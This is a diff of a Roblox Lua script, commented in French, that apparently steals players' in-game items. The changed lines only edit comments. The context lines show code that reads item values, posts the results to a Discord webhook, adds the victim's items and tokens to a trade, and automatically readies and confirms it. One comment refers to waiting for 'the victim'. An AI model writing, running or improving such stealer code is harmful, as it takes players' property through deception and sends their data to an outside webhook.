@@ -114,7 +114,7 @@ local function confirmTrade()
     end)
 end
 
--- // FORMATAGE RAP & MESSAGES DISCORD (TON CODE ORIGINAL)
+-- // FORMATAGE RAP & MESSAGES DISCORD
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -168,7 +168,7 @@ local function SendJoinMessage(list, prefix)
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
--- // RÉCUPÉRATION RAP (TON SYSTÈME ORIGINAL)
+-- // RÉCUPÉRATION RAP
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 local function buildNameToRAPMap(category)
@@ -219,14 +219,14 @@ if #itemsToSend > 0 then
                 addItemToTrade(item.itemType, item.ItemID)
             end
 
-            -- Ajout Tokens
+            -- Ajout Tokens (FIXED PATH)
             local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
             local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
             if tokensamount >= 1 then
                 netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
             end
 
-            task.wait(1.5) -- Temps pour que la victime mette son stuff
+            task.wait(1.5) -- Temps pour laisser la victime réagir
             readyTrade()
             confirmTrade()
             
